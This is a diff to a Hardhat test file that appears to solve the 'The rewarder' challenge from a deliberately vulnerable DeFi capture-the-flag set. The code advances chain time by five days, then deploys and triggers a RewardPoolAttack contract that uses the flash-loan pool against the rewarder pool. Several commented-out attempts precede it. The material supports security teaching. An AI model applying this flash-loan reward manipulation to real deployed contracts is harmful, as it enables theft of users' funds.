@@ -66,6 +66,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+	//console.log(this.liquidityToken.address);
+        //console.log(attacker.address);
+        //this.flashLoanPool.flashLoan(this.liquidityToken.balanceOf(this.flashLoanPool.address),{from: attacker.address});
+        //this.rewarderPool.deposit(this.liquidityToken.balanceOf(attacker.address),{from: attacker.address});
+	//this.rewarderPool.distributeRewards();
+	//await time.increase(time.duration.days(5));
+	//increase 5 days on the EVM - next mined block will occur 5 days later 3600 * 24 * 5  (1 hour times 24 hours times 5 days)
+        await network.provider.send("evm_increaseTime", [432000] );
+
+        const RewardPoolAttack = await ethers.getContractFactory('RewardPoolAttack', deployer);
+        this.attackRewardPool = await RewardPoolAttack.deploy(this.rewarderPool.address, this.flashLoanPool.address, attacker.address, this.liquidityToken.address, this.rewardToken.address );
+	this.attackRewardPool.attackReward();
     });
 
     after(async function () {
